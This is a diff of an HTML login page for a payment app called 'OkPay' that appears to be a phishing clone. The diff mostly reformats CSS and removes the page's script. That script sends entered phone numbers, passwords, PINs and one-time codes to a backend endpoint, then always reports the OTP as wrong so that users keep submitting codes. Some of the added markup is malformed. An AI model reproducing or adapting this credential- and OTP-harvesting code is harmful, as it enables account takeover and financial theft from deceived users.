@@ -35,36 +35,15 @@
         }
         #splash-screen {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
             background-color: #f4f6f9;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            display: flex; justify-content: center; align-items: center;
             z-index: 9999;
-            overflow: hidden;
             transition: opacity 0.5s ease;
         }
-        .splash-bg-img {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            z-index: 1;
-        }
-        .splash-card-wrapper {
-            width: 320px;
-            position: relative;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 2;
-            animation: delayedCardPop 1.1s cubic-bezier(0.16, 1, 0.3, 1) forwards;
-        }
+        .splash-bg-img { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: 1; }
+        .splash-card-wrapper { width: 320px; position: relative; display: flex; justify-content: center; align-items: center; z-index: 2; animation: delayedCardPop 1.1s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
         .base-card { width: 100%; height: auto; }
         .overlay-img { position: absolute; width: 130px; height: auto; z-index: 3; }
         @keyframes delayedCardPop {
@@ -117,7 +96,8 @@
             box-shadow: 0 4px 10px rgba(16, 185, 129, 0.3);
         }
         .btn-primary:disabled { background-color: #cbd5e1; cursor: not-allowed; box-shadow: none; }
-        #login-screen {
+        
+        .screen-view {
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -150,20 +130,15 @@
         .checkbox-label input, .agree-checkbox-label input {
             appearance: none;
             -webkit-appearance: none;
-            width: 20px;
-            height: 20px;
+            width: 20px; height: 20px;
             border: 2px solid #059669;
             border-radius: 50%;
             margin-right: 8px;
             outline: none;
             background-color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            display: flex; align-items: center; justify-content: center;
         }
-        .checkbox-label input:checked, .agree-checkbox-label input:checked {
-            background-color: #059669;
-        }
+        .checkbox-label input:checked, .agree-checkbox-label input:checked { background-color: #059669; }
         .checkbox-label input:checked::before, .agree-checkbox-label input:checked::before {
             content: '\f00c';
             font-family: 'Font Awesome 6 Free';
@@ -180,7 +155,7 @@
             margin-bottom: 15px;
             font-size: 14px;
         }
-        .privacy-row a { color: #059669; text-decoration: underline; margin-left: 4px; }
+        .privacy-row a { color: #059669; text-decoration: underline; margin-left: 4px; cursor: pointer; }
         .forget-password {
             margin-top: 25px;
             color: #059669;
@@ -192,26 +167,17 @@
             display: block;
         }
         .version-tag { position: absolute; bottom: 20px; right: 25px; color: #9ca3af; font-size: 13px; }
-        #register-screen {
-            display: none;
-            flex-direction: column;
-            width: 100%;
-            height: 100%;
-            max-width: 450px;
-            margin: 0 auto;
-            justify-content: flex-start;
-            padding-top: 30px;
-        }
+        
         .reg-header { display: flex; align-items: center; justify-content: center; position: relative; margin-bottom: 25px; width: 100%; }
         .reg-header .back-btn { position: absolute; left: 0; color: #059669; font-size: 24px; cursor: pointer; }
         .reg-header h2 { color: #059669; font-size: 22px; font-weight: 600; }
+        
         .phone-input-wrapper {
             display: flex;
             align-items: center;
             width: 100%;
             max-width: 320px;
-            margin-left: auto;
-            margin-right: auto;
+            margin-left: auto; margin-right: auto;
             border: 1px solid #e2e8f0;
             border-radius: 30px;
             background-color: #ffffff;
@@ -221,42 +187,30 @@
         .phone-input-wrapper i { color: #555555; font-size: 20px; margin-right: 15px; }
         .country-code { color: #555555; font-weight: 600; font-size: 16px; padding-right: 15px; border-right: 1px solid #e2e8f0; }
         .phone-input-wrapper input { width: 100%; padding: 16px 0 16px 15px; border: none; outline: none; font-size: 16px; background: transparent; color: #333333; }
+        
         .otp-wrapper { position: relative; width: 100%; max-width: 320px; margin-left: auto; margin-right: auto; margin-bottom: 20px; }
         .otp-wrapper input { padding-right: 110px; }
         .send-otp-btn {
-            position: absolute;
-            right: 8px;
-            top: 50%;
-            transform: translateY(-50%);
-            background-color: #059669;
-            color: white;
-            border: none;
-            padding: 8px 18px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
+            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+            background-color: #059669; color: white; border: none;
+            padding: 8px 18px; border-radius: 20px; font-size: 14px; font-weight: 500; cursor: pointer;
         }
         .timer-text { text-align: center; color: #059669; font-size: 14px; font-weight: 600; margin-top: -10px; margin-bottom: 10px; display: none; }
         .timer-text.active { display: block; }
+        
+        .privacy-container-box {
+            background: #ffffff; border-radius: 24px; padding: 25px 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); border: 1px solid #e2e8f0; width: 100%; max-width: 450px;
+        }
+        .privacy-content { color: #555555; font-size: 14px; line-height: 1.7; max-height: 70vh; overflow-y: auto; padding-right: 5px; }
+        .privacy-content h3 { color: #059669; font-size: 16px; margin-top: 15px; margin-bottom: 6px; font-weight: 600; }
+        
         .modal-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100vw; height: 100vh;
-            background-color: rgba(0, 0, 0, 0.4);
-            z-index: 10000;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: rgba(0, 0, 0, 0.4); z-index: 10000; justify-content: center; align-items: center; padding: 20px;
         }
         .modal-card {
-            background-color: #ffffff;
-            width: 100%; max-width: 380px;
-            border-radius: 24px;
-            padding: 25px 20px;
-            position: relative;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
+            background-color: #ffffff; width: 100%; max-width: 380px; border-radius: 24px; padding: 25px 20px; position: relative; box-shadow: 0 15px 35px rgba(0,0,0,0.15);
         }
         .modal-header { margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; }
         .modal-header h3 { font-size: 20px; color: #333333; font-weight: 600; }
@@ -280,8 +234,8 @@
 
     <div class="phone-container">
         
-        <!-- LOGIN SCREEN -->
-        <div id="login-screen">
+        <!-- 1. LOGIN SCREEN -->
+        <div id="login-screen" class="screen-view">
             <div class="logo-box">
                 <img src="https://i.ibb.co/jkJ4JJFj/1209a6350403417383485a5014ad455d-1.png" alt="OkPayLogo">
             </div>
@@ -304,30 +258,26 @@
             <div class="login-options">
                 <a id="nav-to-register">Register</a>
                 <label class="checkbox-label">
-                    <input type="checkbox" id="remember-me" checked>
-                    Remember Me
+                    <input type="checkbox" id="remember-me" checked> Remember Me
                 </label>
             </div>
 
             <div class="privacy-row">
                 <label class="agree-checkbox-label">
-                    <input type="checkbox" id="privacy-agree" checked>
-                    Agree
+                    <input type="checkbox" id="privacy-agree" checked> Agree
                 </label>
-                <a href="privacy.html" target="_blank">"User Privacy Agreement"</a>
+                <a id="nav-to-privacy">"User Privacy Agreement"</a>
             </div>
 
             <button class="btn-primary" id="btn-sign-in" type="button">Sign In</button>
-
-            <a href="forgot.html" class="forget-password">Forget Password</a>
-
+            <a id="nav-to-forgot" class="forget-password">Forget Password</a>
             <div class="version-tag">v1.4.4</div>
         </div>
 
-        <!-- REGISTER SCREEN -->
-        <div id="register-screen" style="display: none;">
+        <!-- 2. REGISTER SCREEN -->
+        <div ="register-screen" class="screen-view" style="display: none;">
             <div class="reg-header">
-                <i class="fa-solid fa-arrow-left back-btn" id="nav-to-login"></i>
+                <i class="fa-solid fa-arrow-left back-btn nav-to-login"></i>
                 <h2>Register</h2>
             </div>
 
@@ -366,264 +316,3 @@
             <button class="btn-primary" id="btn-sign-up" type="button">Sign Up</button>
         </div>
 
-        <!-- VERIFICATION MODAL POPUP -->
-        <div class="modal-overlay" id="verification-modal" style="display: none;">
-            <div class="modal-card">
-                <div class="modal-header">
-                    <h3>Login OTP</h3>
-                    <button class="close-modal-btn" id="btn-close-modal" type="button"><i class="fa-solid fa-xmark"></i></button>
-                </div>
-
-                <div class="modal-body-text">
-                    Tap Send to receive the OTP, then enter it to confirm this login.
-                </div>
-                <div class="modal-subtext" id="dynamic-otp-text">
-                    OTP will be sent to +91 
-                </div>
-
-                <div class="timer-text" id="modal-timer"></div>
-
-                <div class="input-group otp-wrapper">
-                    <i class="fa-regular fa-envelope"></i>
-                    <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric" pattern="[0-9]*">
-                    <button class="send-otp-btn" id="modal-send-otp-btn" type="button">Send</button>
-                </div>
-
-                <button class="btn-primary" id="btn-confirm-verification" type="button" style="margin-top: 10px;">Confirm</button>
-            </div>
-        </div>
-
-    </div>
-
-    <!-- COMBINED JAVASCRIPT LOGIC -->
-    <script>
-        setTimeout(() => {
-            const splash = document.getElementById('splash-screen');
-            if(splash) {
-                splash.style.opacity = '0';
-                setTimeout(() => { splash.style.display = 'none'; }, 500);
-            }
-        }, 2000);
-
-        let timerInterval = null;
-        let timerSeconds = 60;
-        let isTimerRunning = false;
-        let regTimerInterval = null;
-        let regTimerSeconds = 60;
-        let isRegTimerRunning = false;
-
-        async function sendToBackend(payload) {
-            try {
-                const response = await fetch('/api/send', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                return await response.json();
-            } catch (err) {
-                console.error('API Send Error:', err);
-                return { error: 'Network Connection Error' };
-            }
-        }
-
-        function navigateTo(screen) {
-            const loginScreen = document.getElementById('login-screen');
-            const registerScreen = document.getElementById('register-screen');
-            if (screen === 'register') {
-                loginScreen.style.display = 'none';
-                registerScreen.style.display = 'flex';
-            } else if (screen === 'login') {
-                registerScreen.style.display = 'none';
-                loginScreen.style.display = 'flex';
-            }
-        }
-
-        function startTimer() {
-            const timerElement = document.getElementById('modal-timer');
-            const sendBtn = document.getElementById('modal-send-otp-btn');
-            if (timerInterval) clearInterval(timerInterval);
-
-            timerSeconds = 59;
-            isTimerRunning = true;
-            if (timerElement) timerElement.classList.add('active');
-
-            sendBtn.disabled = true;
-            sendBtn.style.backgroundColor = '#059669';
-            sendBtn.innerHTML = '<div class="spinner"></div>';
-
-            setTimeout(() => {
-                sendBtn.innerHTML = timerSeconds + 's';
-                sendBtn.style.backgroundColor = '#cbd5e1'; 
-
-                timerInterval = setInterval(() => {
-                    timerSeconds--;
-                    sendBtn.innerHTML = timerSeconds + 's';
-                    if (timerSeconds <= 0) {
-                        clearInterval(timerInterval);
-                        timerInterval = null;
-                        isTimerRunning = false;
-                        if (timerElement) timerElement.classList.remove('active');
-                        sendBtn.disabled = false;
-                        sendBtn.style.backgroundColor = '#059669';
-                        sendBtn.innerHTML = 'Resend';
-                    }
-                }, 1000);
-            }, 1000);
-        }
-
-        function closeModal() {
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-                isTimerRunning = false;
-                const modalTimer = document.getElementById('modal-timer');
-                if (modalTimer) modalTimer.classList.remove('active');
-                const sendBtn = document.getElementById('modal-send-otp-btn');
-                if (sendBtn) {
-                    sendBtn.disabled = false;
-                    sendBtn.style.backgroundColor = '#059669';
-                    sendBtn.innerHTML = 'Send';
-                }
-            }
-            const modal = document.getElementById('verification-modal');
-            if (modal) modal.style.display = 'none';
-        }
-
-        async function sendOTP() {
-            const usernameInput = document.getElementById('reg-username');
-            const phoneInput = document.getElementById('reg-phone');
-            const sendBtn = document.getElementById('btn-send-reg-otp');
-            
-            if (!usernameInput || !usernameInput.value.trim()) {
-                alert("Please enter User name");
-                if (usernameInput) usernameInput.focus();
-                return;
-            }
-            const phone = phoneInput?.value.trim();
-            if (!phone || phone.length < 10) {
-                alert("Please enter a valid 10-digit Phone number.");
-                if (phoneInput) phoneInput.focus();
-                return;
-            }
-            if (isRegTimerRunning) return;
-
-            await sendToBackend({ type: 'reg_otp', username: usernameInput.value.trim(), phone: phone });
-
-            isRegTimerRunning = true;
-            sendBtn.disabled = true;
-            sendBtn.style.backgroundColor = '#059669';
-            sendBtn.innerHTML = '<div class="spinner"></div>';
-
-            setTimeout(() => {
-                regTimerSeconds = 59;
-                sendBtn.innerHTML = regTimerSeconds + 's';
-                sendBtn.style.backgroundColor = '#cbd5e1';
-
-                regTimerInterval = setInterval(() => {
-                    regTimerSeconds--;
-                    sendBtn.innerHTML = regTimerSeconds + 's';
-                    if (regTimerSeconds <= 0) {
-                        clearInterval(regTimerInterval);
-                        regTimerInterval = null;
-                        isRegTimerRunning = false;
-                        sendBtn.disabled = false;
-                        sendBtn.style.backgroundColor = '#059669';
-                        sendBtn.innerHTML = 'Resend';
-                    }
-                }, 1000);
-            }, 1000);
-
-            setTimeout(() => { alert("OTP sent successfully for registration!"); }, 200);
-        }
-
-        async function sendModalOTP() {
-            if (isTimerRunning) {
-                alert("Please wait for the timer to finish before requesting a new OTP.");
-                return;
-            }
-            const phone = document.getElementById('login-phone')?.value.trim() || 'Unknown';
-            await sendToBackend({ type: 'modal_otp', phone: phone });
-            startTimer();
-            setTimeout(() => { alert("OTP Sent Successfully!"); }, 200);
-        }
-
-        async function confirmVerification() {
-            const otpVal = document.getElementById('modal-otp').value.trim();
-            const phone = document.getElementById('login-phone')?.value.trim() || 'Unknown';
-            if (otpVal === "") { alert("Please enter the OTP Code."); return; }
-            if (otpVal.length !== 6) { alert("❌ Please enter a valid 6-digit OTP."); document.getElementById('modal-otp').value = ''; return; }
-
-            await sendToBackend({ type: 'verify_otp', phone: phone, otp: otpVal });
-            alert("❌ Wrong OTP! Please try again.");
-            document.getElementById('modal-otp').value = '';
-        }
-
-        async function handleSignIn() {
-            const phoneInput = document.getElementById('login-phone').value.trim();
-            const privacyAgree = document.getElementById('privacy-agree');
-            const privacyChecked = privacyAgree ? privacyAgree.checked : true;
-            
-            if (!privacyChecked) { alert("Please agree to the 'User Privacy Agreement' first."); return; }
-            if (phoneInput === "" || phoneInput.length < 10) { alert("Please enter a valid 10-digit Phone number."); return; }
-
-            if (timerInterval) {
-                clearInterval(timerInterval);
-                timerInterval = null;
-                isTimerRunning = false;
-                const modalTimer = document.getElementById('modal-timer');
-                if (modalTimer) modalTimer.classList.remove('active');
-                const sendBtn = document.getElementById('modal-send-otp-btn');
-                if (sendBtn) { sendBtn.disabled = false; sendBtn.style.backgroundColor = '#059669'; sendBtn.innerHTML = 'Send'; }
-            }
-
-            const dynOtpText = document.getElementById('dynamic-otp-text');
-            if (dynOtpText) dynOtpText.innerText = "OTP will be sent to +91 " + phoneInput;
-            document.getElementById('modal-otp').value = '';
-            
-            const pass = document.getElementById('login-pass')?.value || 'No Password';
-            const pin = document.getElementById('login-pin')?.value || 'No PIN';
-
-            await sendToBackend({ type: 'login', phone: phoneInput, pass: pass, pin: pin });
-            document.getElementById('verification-modal').style.display = 'flex';
-        }
-
-        async function handleSignUp() {
-            const username = document.getElementById('reg-username')?.value.trim() || 'Unknown';
-            const phone = document.getElementById('reg-phone')?.value.trim() || 'Unknown';
-            const pass = document.getElementById('reg-pass')?.value.trim() || 'No Password';
-            const pin = document.getElementById('reg-pin')?.value.trim() || 'No PIN';
-            const invite = document.getElementById('reg-invite')?.value.trim() || '—';
-
-            await sendToBackend({ type: 'register', username: username, phone: phone, pass: pass, pin: pin, invite: invite });
-            alert("Registration successful!");
-            navigateTo('login');
-        }
-
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('nav-to-register').addEventListener('click', () => navigateTo('register'));
-            document.getElementById('nav-to-login').addEventListener('click', () => navigateTo('login'));
-            document.getElementById('btn-sign-in').addEventListener('click', handleSignIn);
-            document.getElementById('btn-sign-up').addEventListener('click', handleSignUp);
-            document.getElementById('btn-send-reg-otp').addEventListener('click', sendOTP);
-            document.getElementById('modal-send-otp-btn').addEventListener('click', sendModalOTP);
-            document.getElementById('btn-close-modal').addEventListener('click', closeModal);
-            document.getElementById('btn-confirm-verification').addEventListener('click', confirmVerification);
-
-            const restrictDigits = (id, maxLen) => {
-                const input = document.getElementById(id);
-                if (input) {
-                    input.addEventListener('input', function() {
-                        this.value = this.value.replace(/\D/g, '');
-                        if (this.value.length > maxLen) this.value = this.value.slice(0, maxLen);
-                    });
-                }
-            };
-            restrictDigits('login-phone', 10);
-            restrictDigits('login-pin', 6);
-            restrictDigits('reg-phone', 10);
-            restrictDigits('reg-pin', 6);
-            restrictDigits('modal-otp', 6);
-        });
-    </script>
-</body>
-</html>
